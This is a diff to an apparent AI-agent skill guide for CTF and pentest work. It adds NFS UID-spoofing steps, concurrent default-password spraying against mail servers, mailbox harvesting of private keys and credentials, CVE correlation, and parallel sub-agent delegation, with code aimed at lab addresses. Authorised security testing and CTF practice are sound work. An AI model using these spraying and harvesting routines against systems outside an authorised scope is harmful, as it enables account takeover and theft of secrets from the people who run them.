@@ -60,6 +60,87 @@ print(result.get("found_flags")) # If flag is in strings!
 
 This runs `file`, `strings`, pattern matching for flags/base64/hex, and extension-based heuristics. Always start here — it catches the easy flags hiding in plaintext.
 
+## Step 0.5: Triage the Surface — Web is Not the Only Track
+
+**Before defaulting to web exploitation, look at what the host actually exposes.**
+Many boxes (HTB, pentest scopes) have *no exploitable web app* — the path is
+through infrastructure services (NFS, mail, SMB, RPC) or a versioned product
+with a known CVE. If you `nmap` a host and reach for `gobuster`/`curl` on a
+static brochure site, **stop and triage first**:
+
+| Surface | Track | Toolkit entry point |
+|:--------|:------|:--------------------|
+| Web app with forms/params/APIs | Step 1 (web) | `SecurityScanner`, `discover_content`, `map_surface` |
+| NFS export (2049/111) | Infra → NFS below | `NFSEnumerator` |
+| IMAP/POP3/SMTP (25/110/143/993/995) | Infra → Mail below | `MailEnumerator` |
+| Any service with a version banner | CVE correlation below | `correlate_cves`, `nuclei_scan` |
+
+**Use the toolkit — do not hand-roll these in bash.** The modules below were
+built from live engagements specifically because improvised bash flails on them
+(serial mail spray times out; NFS mount mechanics eat 10+ minutes). They are
+already installed and importable: `from bugbounty_ctf.api import ...`.
+
+**These tracks are independent — run them in parallel.** Don't enumerate NFS,
+then mail, then web one after another in your own context. Fan them out to
+concurrent sub-agents with `SkillOrchestrator.fan_out(...)` (see the
+"Delegate independent work to PARALLEL sub-agents" section) and merge the
+results. This is the single biggest fix for a run that stalls.
+
+### Infra → NFS enumeration
+
+```python
+from bugbounty_ctf.nfs_enum import NFSEnumerator
+
+nfs = NFSEnumerator("10.10.10.10")
+exports = nfs.list_exports()                 # showmount -e
+for path in nfs.candidate_mounts(exports):   # advertised + parents + common roots
+    print("try:", path)                      # servers often serve parents they don't advertise
+
+# Mounting needs root (this is a LOCAL constraint, not the target's):
+res = nfs.try_mount("/srv/nfs/onboarding", "/mnt/x")   # sudo, or run the process as root
+report = NFSEnumerator.scan_dir("/mnt/x")    # SSH keys, secrets, AND uid_locked files
+print(report["ssh_keys"], report["uid_locked"])
+```
+
+**Don't burn time on the mount.** `mount.nfs` requires root — if you can't
+`sudo`, that's the blocker, not the export. The high-value output is
+`scan_dir(...)["uid_locked"]`: files you *can't* read, with the **owner UID to
+spoof**. The classic NFS attack is AUTH_SYS UID-spoofing — create a local user
+with that UID (or run as it) and re-read. Don't stop at "permission denied."
+
+### Infra → Mail enumeration (IMAP/POP3)
+
+```python
+from bugbounty_ctf.mail_enum import MailEnumerator
+
+mail = MailEnumerator("10.10.10.10")                 # IMAP4_SSL :993 by default
+valid = mail.spray(users, ["Welcome2024!", "Changeme123"], workers=12)  # CONCURRENT
+for user, pw in valid:
+    loot = mail.harvest(user, pw)                    # dumps mailboxes, extracts secrets
+    print(loot["private_keys"], loot["credentials"], loot["attachments"])
+```
+
+Spraying is concurrent on purpose — **serial spraying over TLS times out**.
+Onboarding/default passwords are usually shared across users, so spray a small
+password list across all discovered users at once. `harvest()` pulls SSH keys
+and credential-shaped lines out of every mailbox and attachment.
+
+### Version banner → CVE correlation & template scan
+
+```python
+from bugbounty_ctf.template_scan import correlate_cves, nuclei_scan, builtin_template_scan
+
+# Self-contained: bundled CVE DB (offline). Pass online=True to refresh from NVD.
+cves = correlate_cves([{"product": "roundcube", "version": "1.6.10"}])  # → CVE-2025-49113
+
+# nuclei auto-installs + updates templates; builtin_template_scan is dependency-free.
+findings = nuclei_scan("http://target/")             # falls back gracefully if offline
+findings += builtin_template_scan("http://target/")  # bundled generic exposure templates
+```
+
+Always correlate service versions against `correlate_cves` before assuming a
+service is a dead end — a patched-looking banner may still match a known CVE.
+
 ## Step 1: Web Exploitation — Black-Box Methodology
 
 ### Phase 0: Load Testing Engine
@@ -147,10 +228,13 @@ for s in suggestions:
 ### Multi-Agent Skill Orchestrator
 
 When running as a Hermes skill, use the SkillOrchestrator to guide testing
-through 4 phases. The Hermes agent (you) IS the reasoning engine — no
-subprocess spawning needed. The orchestrator provides phase guidance with
-RAG context and scanner state, and you execute the instructions using
-the toolkit functions:
+through 4 phases. The Hermes agent (you) IS the reasoning engine — you execute
+phase guidance in-process. But you are **not limited to working alone**: when a
+target has independent tracks, delegate them to parallel sub-agents with
+`runner.fan_out(...)` (see "Delegate independent work" below) instead of running
+everything serially in your own context. The orchestrator provides phase
+guidance with RAG context and scanner state, and you execute the instructions
+using the toolkit functions:
 
 ```python
 from bugbounty_ctf.skill_runner import SkillOrchestrator
@@ -251,6 +335,38 @@ How the sub-agent workflow stays coherent:
 Use the in-process `get_*_guidance()` flow when an interactive Hermes agent is
 the reasoning engine; use `run_with_agents()` when nothing is driving and the
 orchestrator must spawn the reasoning agents itself.
+
+#### Delegate independent work to PARALLEL sub-agents (do not do everything yourself)
+
+Even when **you** are the interactive reasoning engine, do not grind every
+service serially in your own context — that fills your context window and serial
+work (e.g. one mount/spray at a time) is what makes a run stall. When a target
+exposes **independent tracks** — NFS, mail, web discovery, CVE correlation —
+fan them out to concurrent sub-agents and merge their findings centrally:
+
+```python
+from bugbounty_ctf.skill_runner import SkillOrchestrator
+
+runner = SkillOrchestrator("http://10.10.10.10/")
+result = runner.fan_out([
+    ("nfs",  "Enumerate NFS on 10.10.10.10 with bugbounty_ctf.nfs_enum.NFSEnumerator: "
+             "list exports, propose candidate mounts, and report uid_locked files to spoof."),
+    ("mail", "Enumerate IMAP/POP3 on 10.10.10.10 with bugbounty_ctf.mail_enum.MailEnumerator: "
+             "spray a small default-password list across discovered users, then harvest."),
+    ("web",  "Run discover_content() + map_surface() against http://10.10.10.10/ and "
+             "correlate any service version with correlate_cves()."),
+])
+print(result["merged"], "findings merged from", len(result["responses"]), "tracks")
+```
+
+`fan_out([(label, instruction), …])` spawns one `hermes -z` sub-agent **per
+track concurrently**, each with the shared scanner bootstrap, parses each one's
+`<FINDINGS>` block, and merges them (deduped) into your scanner. Wall-clock is
+the slowest single track, not their sum — and your own context stays clean for
+the exploit-chaining decisions that actually need your reasoning.
+
+**Rule of thumb:** if two pieces of work don't depend on each other's output,
+delegate them in one `fan_out()` call rather than running them back-to-back.
 
 ### Phase 1: Reconnaissance (Map the surface)
 
@@ -688,6 +804,9 @@ Many CTF labs are **vulnerability identification exercises**, not flag-capture:
 | `bugbounty_ctf/quick_tests.py` | Quick test wrappers: one-liners for SQLi, SSTI, CMDi, path traversal, NoSQLi, LDAP, SSRF |
 | `bugbounty_ctf/advanced_tests.py` | Advanced: WAF/defense detection, race conditions, XXE, deserialization, JWT, file upload, XSS, IDOR, GraphQL, chain exploitation, reporting |
 | `bugbounty_ctf/web_recon.py` | Automated web target recon (shell-injection-safe) |
+| `bugbounty_ctf/nfs_enum.py` | **Infra:** NFS exports, parent/sibling mount candidates, sensitive-file + UID-locked scan (AUTH_SYS spoofing) |
+| `bugbounty_ctf/mail_enum.py` | **Infra:** IMAP/POP3 login check, concurrent credential spray, mailbox/attachment secret harvest |
+| `bugbounty_ctf/template_scan.py` | nuclei wrapper (auto-install), dependency-free builtin templates, version→CVE correlation (bundled DB + live NVD) |
 | `bugbounty_ctf/callback_listener.py` | HTTP listener for XSS/SSRF callback testing |
 | `bugbounty_ctf/alpine_pty_extract.py` | SUID binary file extraction via PTY |
 | `references/payload-library.md` | Organized payload sets by vulnerability class with Python dicts |
